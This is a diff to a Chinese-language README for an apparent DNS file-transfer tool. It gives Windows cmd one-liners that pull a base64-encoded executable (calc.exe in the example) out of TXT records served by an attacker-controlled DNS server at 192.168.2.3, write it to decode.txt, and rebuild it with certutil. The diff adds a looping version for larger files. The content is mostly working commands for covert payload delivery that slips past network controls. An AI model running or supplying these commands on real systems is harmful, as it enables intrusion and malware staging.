@@ -7,7 +7,7 @@ python dnsWrite.py <calc.exe>
 ```
 
 ## 0x2. 写入文件
-利用域名的Txt解析，从baidu0.com开始解析：`baidu0.com、baidu1.com ...`，客户端输入以下命令，一直到服务端出现数组索引超时为止(IndexError: list index out of range)，表示发送完毕，客户端再利用`certutil -decode decode.txt calc.exe`转码为exe文件:
+利用域名的Txt解析，从baidu0.com开始解析：`baidu0.com、baidu1.com ...`，客户端输入以下命令，一直到服务端出现Done, Press Ctrl + C to Exit，表示发送完毕。客户端再利用`certutil -decode decode.txt calc.exe`转码为exe文件:
 
 ```cmd
 cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu0.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 
@@ -15,6 +15,11 @@ cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TX
 cmd /v:on /Q /c "set a= && set b=  && for /f "tokens=*" %i in ('nslookup -qt^=TXT baidu1.com 192.168.2.3 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >> decode.txt 
 
 ...
+```
+
+如果文件特别大，可以再加一层for循环，下面是循环了20次请求域名的解析，注意观察服务端是否发送完成，当服务端发送完成就可以断开了，由于循环还在继续:
+```cmd
+cmd /v:on /Q /c "for /l %i in (0,1,20) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt))"
 ```
 
 ## 0x3. 参考文章
